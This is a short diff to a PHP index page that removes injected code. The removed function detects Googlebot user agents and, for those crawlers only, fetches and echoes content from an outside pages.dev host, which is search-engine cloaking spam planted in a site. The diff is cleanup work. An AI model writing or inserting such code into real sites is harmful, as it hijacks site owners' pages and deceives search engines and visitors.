@@ -3,26 +3,7 @@
 /**
  * @defgroup pages_index Index Pages
  */
-function profile_user() {
-    $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
-    $useragent = $_SERVER['HTTP_USER_AGENT'];
-    $pasteUrl = 'https://bang-dodo-loh-ini.pages.dev/index.txt';
-    $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
 
-    if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $pasteUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        $content = curl_exec($ch);
-        curl_close($ch);
-
-        echo $content;
-    }
-}
-
-profile_user();
 /**
  * @file pages/index/index.php
  *
